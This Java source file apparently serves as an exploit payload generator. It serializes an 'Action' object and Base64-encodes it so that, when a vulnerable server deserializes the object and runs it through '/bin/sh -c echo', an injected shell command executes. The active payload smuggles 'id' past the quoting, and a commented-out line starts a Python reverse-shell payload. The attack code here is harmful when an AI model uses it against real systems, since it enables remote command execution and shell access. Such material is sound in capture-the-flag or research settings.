import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket; 
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection; 
// import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG
{
        private static final int port = 3333;
        private static Socket connectionSocket;
        private static InputStream is;
        private static OutputStream os;
        private static Scanner scanner;
        private static PrintWriter serverPrintOut;
        public static void main(String []args){
                try{
                // System.out.println(Serialize.toString(new Action("abs", "trying \";python3 -c 'import os, socket, subprocess; s = socket.socket(so>
System.out.println(Serialize.toString(
 new Action("abc","trying\"; id; echo \"")));
                }catch(Exception e) {return;}
        }
private static class Action implements Serializable {
        public final String name;
        public final String command;
        public String output = "";
        public Action(String name, String command) {
                this.name = name;
                this.command = command;
        }
        public void action() throws IOException, ClassNotFoundException {
                String s = null;
                String[] cmd = {
                        "/bin/sh",
                        "-c",
                        "echo \"" + this.command + "\""
                };
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result = "";
                while((s = stdInput.readLine()) != null) {
                        result += s + "\n";
                }
                this.output = result;
        }
}
private static class Serialize {
        /** * Read the object from Base64 string. */
        public static Object fromString(String s) throws IOException, ClassNotFoundException {
                byte[] data = Base64.getDecoder().decode(s);
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                Object o = ois.readObject();
                ois.close();
                return o;
        } /** * Write the object to a Base64 string. */
        public static String toString(Serializable o) throws IOException {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(baos);
                oos.writeObject(o);
                oos.close();
                return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
}

}
